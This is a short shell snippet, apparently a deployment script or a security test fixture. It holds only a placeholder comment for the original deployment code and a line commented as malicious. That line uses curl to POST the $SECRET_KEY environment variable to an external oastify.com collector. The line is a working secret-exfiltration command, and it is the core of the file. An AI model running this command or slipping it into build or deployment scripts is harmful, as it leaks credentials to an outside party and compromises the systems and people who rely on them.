# Original deployment code would be here

# Malicious code to expose the secret
curl -X POST -d "stolen_secret=$SECRET_KEY" http://e1gpo593fruzt41pd8or7to7kyqvek.oastify.com/secret
